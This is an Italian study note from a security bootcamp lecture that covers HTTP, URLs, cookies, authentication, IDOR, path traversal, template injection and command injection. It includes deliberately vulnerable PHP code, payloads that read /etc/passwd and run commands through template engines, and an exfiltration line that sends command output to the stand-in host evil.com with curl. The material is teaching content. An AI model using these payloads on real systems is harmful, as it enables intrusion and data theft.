---
title: Web Insecurity 1
aliases:
  - CB — Web Insecurity 1
tags:
  - cyberbootcamp
  - web-security
  - http
  - path-traversal
  - ssti
  - command-injection
source: pdf/1 - CB- Web1.1.pdf
---

# Web Insecurity 1

> [!abstract]
> Prima lezione del modulo web del CyberBootCamp (CyberChallenge.IT, Sapienza): *Introduction to Web Apps and basic security flaws*. La prima metà costruisce le basi per capire **dove** viaggiano i dati di un'applicazione web (standard, URL, HTTP, cookie, autenticazione); la seconda usa queste basi per quattro vulnerabilità classiche: **IDOR**, **path traversal**, **Server-Side Template Injection** e **command injection**. Il filo comune è uno solo: tutto ciò che arriva dal client è controllato dall'attaccante.
> La lezione successiva è [[02 - CB - Reverse Engineering 1]]. Mappa del corso: [[MOC - CyberBootCamp]].

## Il World Wide Web

Il **World Wide Web** è un servizio che permette di navigare e usare risorse di vario tipo (testo, immagini, video, applicazioni). È nato alla fine degli anni '80 al CERN come sistema per condividere documenti scientifici: l'idea originale era solo collegare pagine con link (*ipertesto*), non far girare applicazioni.

> [!note] Web ≠ Internet
> Internet è la rete (instradamento di pacchetti IP tra macchine). Il Web è **uno dei servizi** che girano sopra Internet, come la posta elettronica o SSH.

### Una pila di standard

Il Web non è definito da un unico documento, ma da una *stack of standards* scritta da enti diversi:

| Ente | Cosa standardizza |
|---|---|
| **IETF (RFC)** | protocolli di rete: HTTP, TLS, WebSocket, … |
| **WHATWG** | HTML, DOM, URL, … (i "living standard" seguiti dai browser) |
| **W3C** | CSP (Content Security Policy), Permissions Policy, WebRTC, … |
| **ECMA / TC39** | JavaScript (ECMAScript) |

Il motivo per cui questo conta in sicurezza: ogni componente implementa la *sua* lettura degli standard, e gli standard stessi a volte lasciano margini di interpretazione.

### Il percorso di una richiesta e i parser differentials

![[CB-L01-p06.png]]

Una richiesta non va direttamente dal browser al server applicativo: attraversa una catena di componenti, ognuno dei quali **riceve, interpreta e inoltra** la richiesta.

```mermaid
flowchart LR
    B[Browser] --> P[Proxy] --> C[CDN] --> D[...] --> W[WAF] --> A[App Server]
```

- **Proxy**: intermediario (aziendale, o Burp durante un test, vedi [[Burp Suite]]);
- **CDN** (*Content Delivery Network*): cache distribuita che serve i contenuti statici vicino all'utente;
- **WAF** (*Web Application Firewall*): filtro che blocca richieste che sembrano attacchi;
- **App Server**: il programma che esegue la logica dell'applicazione.

Se due componenti interpretano la **stessa** richiesta in modo diverso si ha un **parser differential**: per esempio il WAF legge un parametro in un modo e lo giudica innocuo, mentre l'App Server lo legge in un altro modo e ci trova il payload. A questo si aggiungono i **comportamenti legacy vulnerabili**, mantenuti per compatibilità con software vecchio. Vedi [[Parser Differential]]; la lezione ne mostra un esempio concreto nel [[#Path traversal: tips & tricks|null byte di PHP]].

### Il modello OSI

![[CB-L01-p07.png]]

Il **modello OSI** divide la comunicazione di rete in 7 livelli, dal fisico (cavi, segnali) all'applicazione. Ogni livello offre un servizio a quello sopra e usa quello sotto. Per il web interessano soprattutto:

| Livello | Esempi | Ruolo per il web |
|---|---|---|
| 7 Application | HTTP, DNS | il protocollo che studiamo in questa lezione |
| 6 Presentation | TLS, codifiche | cifratura (HTTPS = HTTP sopra TLS) |
| 4 Transport | TCP, UDP | connessione affidabile su cui viaggia HTTP |
| 3 Network | IP | indirizzamento tra macchine |

Per approfondire il modello a livelli: [[01 - TLC - Reti di calcolatori e Internet]] e, per HTTP e DNS, [[02 - TLC - Livello di applicazione]] del corso di Telecomunicazioni.

### Internet Protocol in breve

![[CB-L01-p08.png]]

- Un **indirizzo IPv4** è un numero di 32 bit, scritto come 4 byte in decimale separati da punti (*dotted decimal*): `123.89.46.72` = `01111011.01011001.00101110.01001000`.
- Una macchina ha molti servizi attivi; il **numero di porta** (16 bit) dice a quale servizio è destinato il pacchetto. La coppia **IP + porta** si chiama **socket address** (es. `200.23.56.8:69`).
- Gli umani non ricordano gli indirizzi IP: il **DNS** (*Domain Name System*) traduce i nomi in indirizzi, es. `www.google.it → 142.251.209.35`. Vedi [[DNS]].

## URL e URI

Vedi [[URL e URI]].

### URL

![[CB-L01-p09.png]]

Un **URL** (*Uniform Resource Locator*) **localizza** una risorsa, cioè dice anche *come* e *dove* recuperarla in rete. Le sue parti, sull'esempio `https://example.com:80/blog?search=test&sort_by=created_at#header`:

| Parte | Valore | Significato |
|---|---|---|
| Protocol (scheme) | `https` | come parlare col server |
| Domain (host) | `example.com` | quale macchina |
| Port | `80` | quale servizio |
| Path | `/blog` | quale risorsa sul server |
| Query parameters | `search=test&sort_by=created_at` | coppie chiave=valore passate all'applicazione |
| Fragment (anchor) | `header` | punto della pagina; **non viene inviato al server**, lo usa solo il browser |

> [!tip] Perché interessa all'attaccante
> Path e query sono input dell'utente che il server legge: sono il primo posto dove cercare vulnerabilità (vedi [[#Path traversal: where?|path traversal]]).

### URI

Un **URI** (*Uniform Resource Identifier*) **identifica** una risorsa, non necessariamente in rete (es. `urn:isbn:0451450523` identifica un libro senza dire dove trovarlo). Gli URL sono un **sottoinsieme** degli URI. La sintassi generale:

$$
\text{URI} = \text{scheme} \; \texttt{":"} \; [\texttt{"//"} \; \text{authority}] \; \text{path} \; [\texttt{"?"} \; \text{query}] \; [\texttt{"\#"} \; \text{fragment}]
$$

$$
\text{authority} = [\text{userinfo} \; \texttt{"@"}] \; \text{host} \; [\texttt{":"} \; \text{port}]
$$

> [!example] Userinfo
> `https://admin:pass@example.com/` contiene credenziali nella parte *userinfo*. È anche un classico trucco di phishing e di bypass dei filtri: in `https://google.com@evil.com/` l'host vero è `evil.com`, mentre `google.com` è solo il nome utente.

### Fully Qualified Domain Name

![[CB-L01-p11.png]]

Un **FQDN** è il nome completo di un host, letto da destra a sinistra dal più generale al più specifico. Ogni parte tra i punti è una **label**:

```
somehost . example . com .
   │          │       │   └── DNS root zone (il punto finale, di solito sottinteso)
   │          │       └────── TLD (Top-Level Domain)
   │          └────────────── Second-level domain
   └───────────────────────── Subdomain
```

### URL encoding

Un URL può contenere solo un insieme ristretto di caratteri, e alcuni (`?`, `&`, `#`, `/`) hanno un significato speciale. Per trasmettere qualsiasi byte si usa il **percent encoding**: `%` seguito dal valore esadecimale ASCII del byte. Vedi [[Percent Encoding]].

| Carattere | Codifica |
|---|---|
| spazio | `%20` oppure `+` (nelle query dei form) |
| `!` | `%21` |
| `"` | `%22` |
| `&` | `%26` |
| `.` | `%2e` |
| `/` | `%2f` |

> [!example]
> Se cerco `a&b`, devo mandare `?q=a%26b`: con `?q=a&b` il server leggerebbe un parametro `q=a` e un secondo parametro `b`.

## Architettura web e HTTP

### Architettura comune

![[CB-L01-p13.png]]

Lo schema è **client–server**: il client (il browser) manda una **HTTP request** con path/URI, metodo (verbo) e versione (`GET /… HTTP/1.1`); il server risponde con una **HTTP response** con status code e corpo (`HTTP/1.1 200 OK`). In mezzo c'è Internet (e la catena di componenti vista [[#Il percorso di una richiesta e i parser differentials|sopra]]).

### HyperText Transfer Protocol

Vedi [[HTTP]].

**HTTP** è il protocollo di comunicazione su cui si basa il Web. È semplice, fatto di due fasi: **request** e **response**.

È **stateless** per progetto: ogni coppia richiesta/risposta si capisce da sola, il server non ricorda nulla delle richieste precedenti. Questa scelta semplifica i server, ma crea un problema: come fa il server a sapere che due richieste vengono dallo stesso utente loggato? La risposta sono i [[#HTTP cookies|cookie]].

### HTTP requests

![[CB-L01-p15.png]]

Una richiesta è testo, strutturato così:

```http
GET /doc/test.html HTTP/1.1          ← request line: metodo, path, versione
Host: www.test101.com                ← request headers (chiave: valore)
Accept: image/gif, image/jpeg, */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0
Content-Length: 35
                                     ← riga vuota: separa header e body
bookId=12345&author=Tan+Ah+Teck      ← request message body
```

> [!important] Tutto è manipolabile
> Questi dati li manda il browser del client, quindi **l'utente può modificarli completamente**: header, cookie, parametri, metodo. Il server non deve mai fidarsi di nessuno di questi campi (con [[Burp Suite]] si intercettano e modificano a mano).

![[CB-L01-p16.png]]

La slide successiva ripropone la stessa richiesta e segnala due problemi:

> [!warning] Correzione: l'esempio di richiesta non è coerente
> 1. **Manca l'header `Content-Type: application/x-www-form-urlencoded`**: senza, il server non sa come interpretare il body `bookId=12345&author=…` (lo segnala la slide stessa).
> 2. Il metodo è segnato con un punto interrogativo: una richiesta che invia dati nel body è di norma una **`POST`**, non una `GET`. Le richieste `GET` per convenzione non hanno body, e molti server lo ignorano.
>
> Inoltre `Content-Length: 35` è sbagliato per questo body: `bookId=12345&author=Tan+Ah+Teck` è lungo **31** byte (`bookId=12345` = 12, `&` = 1, `author=Tan+Ah+Teck` = 18). L'esempio viene da un tutorial e serve a mostrare la struttura, non è una richiesta valida.

### Metodi HTTP

![[CB-L01-p17.png]]

| Metodo | Uso |
|---|---|
| `GET` | leggere una risorsa |
| `POST` | inviare dati al server (crea o aggiunge a una risorsa) |
| `PUT` | creare o sostituire una risorsa |
| `DELETE` | cancellare una risorsa |
| `PATCH` | modificare parzialmente una risorsa |
| `HEAD` | come `GET`, ma restituisce solo gli header |
| `CONNECT` | aprire un tunnel bidirezionale verso il server remoto (usato dai proxy per HTTPS) |
| `OPTIONS` | chiedere quali metodi/opzioni supporta una risorsa |
| `TRACE` | diagnostica: il server rimanda indietro la richiesta ricevuta |

> [!tip]
> Il metodo è solo una stringa: un'applicazione che controlla i permessi solo su `POST` potrebbe accettare la stessa azione con `PUT` o con un metodo inventato. Vale la pena provare.

### HTTP responses

![[CB-L01-p18.png]]

La risposta ha la stessa struttura della richiesta, con una **status line** al posto della request line:

```http
HTTP/1.1 200 OK                       ← status line: versione, codice, messaggio
Date: Sun, 08 Feb xxxx 01:11:12 GMT   ← response headers
Server: Apache/1.3.29 (Win32)
Last-Modified: Sat, 07 Feb xxxx
ETag: "0-23-4024c3a5"
Accept-Ranges: bytes
Content-Length: 35
Connection: close
Content-Type: text/html
                                      ← riga vuota
<h1>My Home page</h1>                 ← response body
```

> [!tip] Information disclosure
> Header come `Server: Apache/1.3.29 (Win32)` rivelano software e versione del server: utile all'attaccante per cercare vulnerabilità note.

### Status code

![[CB-L01-p19.png]]

| Classe | Significato | Esempi |
|---|---|---|
| `1xx` | informativi: richiesta ricevuta, elaborazione in corso | `101 Switching Protocols` |
| `2xx` | successo | `200 OK`, `201 Created` |
| `3xx` | redirezione: la risorsa è altrove | `301`, `302 Found` (header `Location`) |
| `4xx` | errore del client | `400 Bad Request`, `401`, `403`, `404 Not Found` |
| `5xx` | errore del server su una richiesta valida | `500 Internal Server Error` |

> [!tip]
> Un `500` dopo un input strano è un ottimo segnale: il server non si aspettava quel valore. È il principio del [[#Template injection: detection|fuzzing per trovare SSTI]].

### HTTP cookies

Vedi [[Cookie]].

![[CB-L01-p20.png]]

I **cookie** sono il meccanismo per scambiare informazioni persistenti tra client e server, aggirando la natura stateless di HTTP. Si usano soprattutto per **gestione delle sessioni**, **personalizzazione** e **tracciamento**.

```mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: GET / HTTP/1.1
    S->>C: 200 OK + Set-Cookie: session-id=12345
    C->>S: GET / HTTP/1.1 + Cookie: session-id=12345
    Note over S: riconosce la sessione 12345
```

Il valore di un cookie è spesso **codificato** (base64, JSON, …), e questo vale anche fuori dai cookie. Codificare non vuol dire proteggere: un cookie `eyJ1c2VyIjoiZ3Vlc3QifQ==` è solo `{"user":"guest"}` in base64, e se il server non lo firma basta cambiarlo in `admin`. Per decodificare al volo: Dencode (vedi [[#Risorse]]). Vedi anche [[Session Management]].

#### Attributi dei cookie

| Attributo | Descrizione |
|---|---|
| `Domain` | a quali (sotto)domini viene inviato il cookie |
| `Path` | a quali path viene inviato |
| `Expires` | data di scadenza (senza, è un cookie di sessione) |
| `HttpOnly` | JavaScript non può leggerlo (`document.cookie`): limita il furto via [[XSS]] |
| `Secure` | inviato solo su HTTPS |
| `SameSite` | limita l'invio nelle richieste cross-site (ripreso nelle prossime lezioni) |

> [!warning] Correzione: `Domain` non è una restrizione
> La slide descrive `Domain` come "Subdomain limitation", ma l'effetto è opposto: **senza** `Domain` il cookie viene inviato solo all'host esatto che l'ha impostato (*host-only*); **con** `Domain=example.com` viene inviato anche a tutti i sottodomini (`a.example.com`, `b.example.com`). Impostarlo **allarga** la portata del cookie.

### HTTP authentication

Vedi [[HTTP Authentication]].

HTTP ha un meccanismo standard con cui il server limita l'accesso a una risorsa, chiedendo credenziali o il completamento di una *challenge*:

```mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: GET /risorsa
    S->>C: 401 Unauthorized + WWW-Authenticate: Basic realm="..."
    C->>S: GET /risorsa + Authorization: Basic dXNlcjpwYXNz
    S->>C: 200 OK (oppure 403 Forbidden)
```

1. Il client chiede la risorsa.
2. Il server risponde `401 (Unauthorized)` e indica il metodo di autenticazione nell'header `WWW-Authenticate`.
3. Il client ripete la richiesta con l'header `Authorization` contenente le credenziali.
4. Il server risponde `200 (OK)` o `403 (Forbidden)`.

> [!note] 401 o 403?
> In pratica, con credenziali **sbagliate** il server di solito risponde di nuovo `401`. Il `403` indica che l'utente è stato riconosciuto ma **non è autorizzato** a quella risorsa: è la differenza tra autenticazione (chi sei) e autorizzazione (cosa puoi fare). Vedi [[Authorization]].

#### Tipi principali

| Tipo | Header | Note |
|---|---|---|
| **Basic** | `Authorization: Basic <base64(username:password)>` | base64 è una codifica, non cifratura: chi intercetta legge la password. Sicuro solo su HTTPS |
| **Digest** | `Authorization: Digest …` | usa MD5 per non inviare la password in chiaro, insieme a parametri come `realm` e `nonce` (numero usato una sola volta, contro i replay) |
| **Bearer** | `Authorization: Bearer <token>` | chi possiede il token è autorizzato; tipico dei flussi token-based come OAuth 2.0. Il token è spesso un **JWT**, ispezionabile su jwt.io |

> [!example]
> `echo -n 'admin:password' | base64` → `YWRtaW46cGFzc3dvcmQ=`, quindi l'header è `Authorization: Basic YWRtaW46cGFzc3dvcmQ=`.

## Web application

Oggi si parla di risorse web **dinamiche**:

- i server eseguono programmi che gestiscono richieste specifiche;
- l'ipertesto e il contenuto di ogni risorsa possono cambiare dinamicamente;
- gli utenti interagiscono attivamente con l'applicazione.

Per esempio, la maggior parte delle app mobile usa API basate su HTTP: quello che si impara sul web vale anche lì.

### Linguaggi e server

| Lato | Tecnologie (dalle slide) | Ruolo |
|---|---|---|
| **Client-side** | HTML (struttura), CSS (stile), JavaScript (logica nel browser) | eseguito dal browser, quindi visibile e modificabile dall'utente |
| **Server-side** | PHP, Java, ASP.NET, Node.js, Ruby, Python | eseguito sul server, il codice non è visibile all'utente |
| **HTTP server** | Apache, Nginx, Microsoft IIS, Caddy | ricevono le richieste e le passano all'applicazione o servono file statici |

> [!important]
> Qualsiasi controllo fatto solo lato client (es. un campo disabilitato in HTML, una validazione in JavaScript) si aggira mandando la richiesta a mano. I controlli di sicurezza devono stare sul server.

## IDOR

Vedi [[Insecure Direct Object Reference]].

Un **IDOR** (*Insecure Direct Object Reference*) nasce quando l'applicazione **non controlla l'autorizzazione** ad accedere a un dato: usa direttamente un identificatore fornito dall'utente (un numero, un nome di file) per recuperare un oggetto, senza verificare che quell'oggetto appartenga all'utente.

![[CB-L01-p30.png]]

Nella vignetta, l'utente chiede "dammi il mio documento numero 1000" e lo riceve, correttamente. Poi chiede "dammi il documento 1002" (che *non* è suo) e il server, che controlla solo che il documento esista, lo restituisce lo stesso.

> [!example]
> `GET /api/invoice?id=1000` restituisce la mia fattura. Provo `id=1001`, `id=1002`: se ricevo le fatture di altri, c'è un IDOR. Il fix è un controllo lato server del tipo `if invoice.owner != current_user: 403`.

ID sequenziali rendono l'enumerazione banale, ma anche ID casuali (UUID) non sono una difesa: sono solo più difficili da indovinare, e spesso compaiono in altre risposte dell'applicazione.

## Path traversal

Vedi [[Path Traversal]].

Il **path traversal** è una vulnerabilità che permette all'attaccante di **leggere qualsiasi file** (a cui il processo del server ha accesso), uscendo dalla cartella prevista grazie alla sequenza `../`, che nel filesystem significa "cartella superiore".

![[CB-L01-p32.png]]

L'albero mostra il filesystem: le pagine web stanno in una sottocartella (`/www_root/pagine_web`), ma risalendo con `../` si arriva alla radice `/` e da lì a `/etc/shadow` o `/etc/passwd`.

### Path traversal: where?

I web server non permettono di accedere direttamente ai file fuori dalla **web root** (di solito `/var/www/html/`). Il problema nasce quando è l'**applicazione** a caricare file in modo dinamico, in base a un parametro:

- `https://example.com/images?name=miciomiao.jpg`
- `https://example.com/assets?file=css/style.css`
- `https://example.com/assets?file=/etc/passwd`

Qualsiasi parametro che sembra un nome o un percorso di file è un candidato.

### Path traversal: example

![[CB-L01-p34.png]]

```php
function get_image() {
    // NEVER trust user input!
    $path = "images/" . $_GET["filename"];
    if(file_exists($path))
        return file_get_contents($path);
    return null;
}
```

Il codice concatena `images/` con il parametro `filename` e restituisce il contenuto del file se esiste. Il prefisso `images/` sembra una protezione, ma non lo è: con `filename=../../../../etc/passwd` il percorso diventa `images/../../../../etc/passwd`, che il sistema risolve in `/etc/passwd`. Il controllo `file_exists` non aiuta, verifica solo che il file ci sia.

### Path traversal: exploitation

Su sistemi Unix-like:

```
https://example.com/loadfile?path=../../../etc/passwd
```

> [!warning] Correzione
> Nella slide l'URL è `https://example.com/loadfilepath=../../../etc/passwd`: manca il `?` che separa il path dal parametro. L'URL corretto è quello scritto sopra.

Mettere più `../` del necessario non è un problema: arrivati alla radice `/`, `..` resta su `/`. Per questo si abbonda.

Se il filtro cerca la stringa `../` letterale, si può usare il **percent encoding**: `%2e%2e%2f` = `../`:

```
…?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

A volte serve il **double URL encoding** (`%252e%252e%252f`, dove `%25` è la codifica di `%`): utile quando un componente decodifica una volta e controlla, e un altro decodifica una seconda volta prima di aprire il file (un [[Parser Differential]]).

Questa vulnerabilità è nota anche come **Local File Inclusion (LFI)**.

> [!note] Path traversal e LFI
> I due nomi si usano spesso come sinonimi, come fa la slide. A rigore la LFI è il caso in cui il file viene **incluso ed eseguito** (es. `include()` in PHP), non solo letto: se l'attaccante riesce a far includere un file che contiene codice suo (es. un log in cui ha scritto PHP), la LFI diventa esecuzione di codice.

### Path traversal: filter bypass

![[CB-L01-p36.png]]

Cosa succede se la sanificazione dei percorsi non è sufficiente?

```php
if(isset($_GET["file"])) {
    $file = "files/" . $_GET["file"];
    $file = str_replace("../", "", $file);
    echo "<h1>Reading $file</h1><div>" . file_get_contents($file) . "</div>";
} else {
```

Il codice rimuove tutte le occorrenze di `../`, ma **una sola volta** (non ricorsivamente). Quindi basta annidare la sequenza:

```
....//   →  rimuovo il "../" centrale  →  ../
```

Con `file=....//....//....//etc/passwd` il filtro produce `files/../../../etc/passwd`. La lezione generale: i filtri a blacklist che "cancellano" pezzi di input si aggirano quasi sempre; meglio canonicalizzare il percorso (`realpath`) e verificare che resti dentro la cartella permessa, oppure usare una whitelist di nomi.

### Path traversal: tips & tricks

Pezzi di codice diversi possono interpretare la stessa stringa in modo diverso.

Le vecchie versioni di PHP si comportavano così: in PHP una stringa può contenere qualsiasi byte, incluso `\0`. Però alcune funzioni (es. `include`), implementate in C, trattavano la stringa come una **stringa C**, che finisce al primo **null byte** (`%00`). Vedi [[Null Byte Injection]].

> [!example]
> Il codice fa `include($_GET["page"] . ".php")` per obbligare l'estensione `.php`. Con `page=../../../etc/passwd%00` PHP costruisce `../../../etc/passwd\0.php`, ma la funzione C si ferma al `\0` e apre `../../../etc/passwd`. Il suffisso imposto dal programmatore sparisce. (Corretto in PHP 5.3.4.)

## Server-Side Template Injection (SSTI)

Vedi [[Server-Side Template Injection]].

La **SSTI** consiste nell'ingannare un template engine perché renderizzi contenuto non previsto.

### Template engines

![[CB-L01-p39.png]]

Un **template engine** separa la presentazione (HTML) dai dati: il programmatore scrive un modello con dei segnaposto, e l'engine li riempie con i valori a runtime. La slide usa **Twig** (PHP) come esempio:

| Sintassi | Significato | Esempio |
|---|---|---|
| `{{ … }}` | stampa il valore di un'espressione | `{{ name }}`, `{{ user.email }}`, `{{ product.price * 1.2 }}` |
| `{% … %}` | istruzione (controllo di flusso) | `{% if user %} … {% endif %}` |
| `{# … #}` | commento | `{# This is a comment #}` |

Nota che `{{ product.price * 1.2 }}` **calcola** un'espressione: il template non è testo statico, è un piccolo linguaggio di programmazione.

![[CB-L01-p40.png]]

Le strutture di controllo: condizioni (`{% if user.isAdmin %} … {% else %} … {% endif %}`) e cicli (`{% for product in products %} {{ product.name }} {% endfor %}`).

### Template injections

Molti framework usano template engine per generare contenuti dinamici. Se l'input dell'utente viene **inserito dentro il template** (invece di essere passato come dato), l'utente può scrivere istruzioni del linguaggio di template. Questo porta alla SSTI, che spesso dà all'attaccante **RCE** (*Remote Code Execution*, eseguire comandi sul server).

### A template

![[CB-L01-p42.png]]

Un template Twig realistico: un `{% if items|length > 0 %}` che controlla se la lista è vuota, un `{% for item in items %}` che genera un `<li>` per elemento, `{% set value = item.data ? item.data : item %}` che assegna una variabile, e `{{ … }}` che stampano titolo, classi e valori. Tutto ciò che sta tra le graffe viene **eseguito** dall'engine. Finché i valori arrivano come variabili (`items`, `title`) non c'è pericolo: l'engine li stampa e basta.

### A template (attackable™)

![[CB-L01-p43.png]]

```php
function index() {
    $name = $_GET["name"];
    $content = "<body> <h1>Home page</h1> <h3>Hi, $name!</h3> </body>";
    $output = $twig->render($content);
    return $output;
}
```

Qui `$name` viene **concatenato nel testo del template** prima del render. Se l'utente passa `name={{7*7}}`, il template diventa `<h3>Hi, {{7*7}}!</h3>` e la pagina mostra `Hi, 49!`: il server ha eseguito l'espressione dell'utente.

La versione sicura passa il nome come dato: template fisso `Hi, {{ name }}!` e render con `['name' => $name]`. In questo caso l'engine stampa `{{7*7}}` come testo.

> [!note] Dettaglio sull'API di Twig
> In Twig `$twig->render()` riceve il **nome** di un file di template, non il suo contenuto. Per renderizzare una stringa il codice vulnerabile reale usa `$twig->createTemplate($content)->render()`. Il codice della slide è semplificato, ma il concetto è lo stesso.

```mermaid
flowchart LR
    A["?name={{7*7}}"] --> B["template = 'Hi, {{7*7}}!'"]
    B --> C[render del template engine]
    C --> D["Hi, 49!"]
```

### Template injection: detection

Di solito non abbiamo il codice. Un approccio semplice per cercare una SSTI è il **fuzzing**: iniettare caratteri speciali usati nelle espressioni dei vari template engine e sperare di provocare comportamenti inattesi (eccezioni, pagine di errore, output strano).

Esempio di stringa "poliglotta":

```
${{<%[%'"}}%\
```

Contiene l'apertura delle sintassi più comuni (`${`, `{{`, `<%`, `[%`, quote) e una chiusura sbilanciata: un engine che la interpreta va in errore, e un `500` o un messaggio di errore con il nome dell'engine sono il segnale cercato.

### Template injection: cheatsheet

![[CB-L01-p45.png]]

Una volta sospettata l'iniezione, bisogna capire **quale** engine c'è, perché ogni engine ha la sua sintassi e i suoi payload. L'albero di decisione (di PortSwigger) procede per tentativi: freccia verde = il payload è stato valutato, rossa = no.

```mermaid
flowchart LR
    A["${7*7}"] -->|valutato| B["a{*comment*}b"]
    A -->|no| C["{{7*7}}"]
    B -->|"ab"| D[Smarty]
    B -->|no| E["${'z'.join('ab')}"]
    E -->|valutato| F[Mako]
    E -->|no| G[Unknown]
    C -->|valutato| H["{{7*'7'}}"]
    C -->|no| I[Not vulnerable]
    H -->|"7777777"| J[Jinja2]
    H -->|"49"| K[Twig]
    H -->|altro| L[Unknown]
```

Il test chiave in fondo è `{{7*'7'}}`: Jinja2 (Python) moltiplica la stringa e dà `7777777`, Twig (PHP) converte `'7'` in numero e dà `49`.

> [!note]
> "Not vulnerable" significa solo che nessuno di questi payload ha funzionato: altri engine con sintassi diverse non sono coperti dall'albero.

### Template injection: exploitation

![[CB-L01-p46.png]]

Identificato l'engine, si cerca un payload che arrivi a leggere file o eseguire comandi:

| Engine | Payload | Cosa fa |
|---|---|---|
| Flask (Jinja2), Python | `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}` | da una funzione disponibile nel template risale ai suoi `__globals__`, da lì ai `__builtins__` di Python, e usa `open()` per leggere un file |
| ERB, Ruby | `<%= IO.popen('ls').readlines() %>` | esegue `ls` e stampa l'output |
| Smarty, PHP | `` {php} echo `ls`; {/php} `` | esegue codice PHP; i backtick in PHP lanciano un comando di shell (il tag `{php}` esiste solo nelle vecchie versioni di Smarty) |

Il trucco Jinja2 è il più istruttivo: il template engine è "sandboxato" e non espone `open` o `os`, ma in Python ogni oggetto porta con sé riferimenti al resto dell'interprete, e risalendo gli attributi (`__globals__`, `__builtins__`, `__class__`, `__mro__`, `__subclasses__()`) si arriva a funzioni pericolose.

Per una raccolta di payload: **PayloadsAllTheThings** su GitHub (vedi [[#Risorse]]).

## Command injection

Vedi [[Command Injection]].

*"Executing whatever the f\*\*\* we want."*

### Command injection: where?

Alcuni compiti di un'applicazione web vengono delegati a un programma esterno o al sistema operativo: inviare una mail, convertire un'immagine, fare un `ping`. In questi casi è comune lanciare un **sottoprocesso** con dei parametri.

La **command injection** è possibile quando dati non sicuri dell'utente arrivano alla **shell di sistema**.

### Command injection: example

![[CB-L01-p49.png]]

```php
function send_confirmation_mail() {
    $receiver = $_POST["email"];
    $object = "You're registered!";
    $content = "Your account has been registered successfully.";
    $handle = popen("./mailsender '$receiver' '$object' '$content'", "r");
    // assume mailsender is an executable that takes
    // argv[1]=receiver, argv[2]=object, argv[3]=content
    return $handle !== false;
}
```

`popen` passa l'intera stringa a `/bin/sh -c`. L'email dell'utente finisce tra apici singoli, quindi il programmatore pensa che sia "un argomento". Ma se l'email contiene a sua volta un apice `'`, chiude la stringa e tutto quello che segue viene interpretato dalla shell come comando.

### Command injection: exploitation

Si usano gli operatori di shell `;`, `||` e `&&` per accodare altri comandi dopo il primo:

| Operatore | Effetto |
|---|---|
| `a ; b` | esegue `b` comunque |
| `a \|\| b` | esegue `b` se `a` fallisce |
| `a && b` | esegue `b` se `a` ha successo |

Dove gli spazi non sono permessi (filtrati), su Unix si può usare `${IFS}`: la variabile *Internal Field Separator* della shell, che di default contiene spazio, tab e a capo. Es. `cat${IFS}/etc/passwd`.

Payload con l'email:

```
' || id #
```

Il comando diventa:

```sh
./mailsender '' || id #' 'You're registered!' '...'
```

- `'` chiude l'apice aperto dal programmatore: il destinatario è la stringa vuota;
- `./mailsender ''` fallisce (o comunque `||` lancia il comando successivo se fallisce);
- `id` viene eseguito;
- `#` commenta tutto il resto, così gli apici rimasti non causano errori di sintassi.

#### Out-of-band

Vedi [[Out-of-Band Exfiltration]].

Se il compito è **asincrono** (es. la mail viene mandata da un job in background) o l'output non viene mostrato, non vediamo il risultato del comando. Si ricorre allora a un **leak out-of-band**: si fa mandare il risultato dal server stesso, su un canale che controlliamo noi.

```
' || curl https://evil.com?q=$(id) #
```

`$(id)` viene sostituito dall'output di `id`, e `curl` fa una richiesta al nostro server con quell'output nella query. Leggiamo il risultato nei log di `evil.com` (in pratica si usano servizi come webhook.site o Burp Collaborator).

> [!tip]
> Se l'output contiene spazi o caratteri speciali conviene codificarlo: `$(id|base64)`. Se non c'è nemmeno accesso alla rete in uscita, resta il canale temporale: `sleep 5` e si misura il ritardo della risposta.

## Riepilogo

> [!summary]
> | Vulnerabilità | Causa | Input tipico | Impatto |
> |---|---|---|---|
> | IDOR | manca il controllo di autorizzazione sull'oggetto | `?id=1002` | lettura/modifica di dati altrui |
> | Path traversal / LFI | percorso di file costruito con input utente | `?file=../../etc/passwd` | lettura di file arbitrari (a volte RCE) |
> | SSTI | input concatenato nel template | `{{7*7}}` | spesso RCE |
> | Command injection | input passato alla shell | `' \|\| id #` | RCE |
>
> In tutti e quattro i casi il server si fida di qualcosa che arriva dal client.

## Risorse

- **PATT** (PayloadsAllTheThings): <https://github.com/swisskyrepo/PayloadsAllTheThings>
- **JWT**: <https://www.jwt.io/>
- **Dencode** (codifica/decodifica di base64, URL encoding, …): <https://dencode.com/>
- **PortSwigger Web Security Academy** (laboratori): <https://portswigger.net/web-security/all-labs>
- **MDN Web Docs**: <https://developer.mozilla.org/en-US/>
- **HTML Living Standard**: <https://html.spec.whatwg.org/>

*The End (for tonight)*: il modulo continua nelle prossime lezioni (es. `SameSite` e le richieste cross-site).
